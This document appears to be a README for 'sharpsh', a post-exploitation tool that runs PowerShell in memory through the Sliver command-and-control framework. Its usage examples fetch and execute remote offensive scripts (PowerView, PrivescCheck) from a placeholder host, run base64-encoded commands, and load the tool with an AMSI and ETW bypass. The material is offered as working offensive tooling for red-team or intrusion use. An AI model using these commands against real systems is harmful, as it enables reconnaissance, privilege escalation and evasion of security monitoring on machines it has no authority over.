# sharpsh
C# .Net Framework program that uses `RunspaceFactory` for Powershell command execution. Built for use with `execute-assembly -E -M -i ...` in [BishopFox/Sliver](https://github.com/bishopfox/sliver).

## Features
- Execute Powershell commands
- Load & execute remote script
- Multiple command & script support
- Encoded command support
- Load & execute script from clipboard

## Usage

```
sharpsh 1.0.0.0
Copyright c  2022

  -c, --cmd          Required. Powershell command to run

  -u, --uri          Fetch script from URI

  -p, --clipboard    Fetch script from clipboard

  -e, --encoded      Encodeded command (base64)

  --help             Display this help screen.

  --version          Display version information.
```

## Examples

```
# execute powershell command
PS > .\sharpsh.exe -c whoami

# execute base64 encoded powershell command
PS > .\sharpsh.exe -e -c d2hvYW1pCg==

# load script from clipboard and execute command
PS > .\sharpsh.exe -p -c Get-NetLocalGroup

# load remote script and execute
PS > .\sharpsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup

# load remote script and execute encoded command
PS > .\sharpsh.exe -u http://x.x.x.x/PowerView.ps1 -e -c R2V0LU5ldExvY2FsR3JvdXAK

# execute multiple powershell commands
PS > .\sharpsh.exe -c hostname,whoami

# execute multiple powershell commands using multiple scripts
PS > .\sharpsh.exe -c get-netlocalgroup,invoke-privesccheck -u http://x.x.x.x/PowerView.ps1,http://x.x.x.x/PrivescCheck.ps1 -b

# sliver inline & bypass AMSI + ETW
sliver > execute-assembly -M -E -i /tools/sharpsh.exe -c get-netlocalgroup -u http://x.x.x.x/psh/PowerSploit/Recon/PowerView.ps1
```

## Planned
- Load & execute embedded script
- Load & execute script from disk
- Compression & encryption support for scripts


## Build
Built using .NET Framework v4.5.1 in Visual Studio 2019.

Be sure to add `c:\windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll` as a reference.

The project uses [`dnMerge`](https://github.com/CCob/dnMerge) so it has to be compiled in `Release` mode.